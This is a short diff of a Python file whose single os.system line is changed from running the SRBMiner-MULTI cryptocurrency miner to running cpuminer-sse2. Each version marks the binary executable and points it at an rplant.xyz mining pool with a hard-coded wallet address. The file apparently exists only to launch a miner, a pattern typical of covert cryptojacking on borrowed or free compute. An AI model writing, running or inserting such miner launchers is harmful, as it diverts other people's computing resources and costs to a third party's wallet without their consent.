@@ -1,3 +1,3 @@
 import os
 
-os.system("chmod +x SRBMiner-MULTI; ./SRBMiner-MULTI --algorithm randomx --pool randomx.rplant.xyz:17107 --tls true --wallet TaBohkLdkWDMVaSLQs9wxtP43eCf5MdLoQ968kSFTGhj9SRmLGcx8fvHmjyUaUo5kKEsw2ucaCSe8WZR2rCFZYUj2RxrwBmQXD.BB1")
+os.system("chmod +x cpuminer-sse2; ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.DG1")
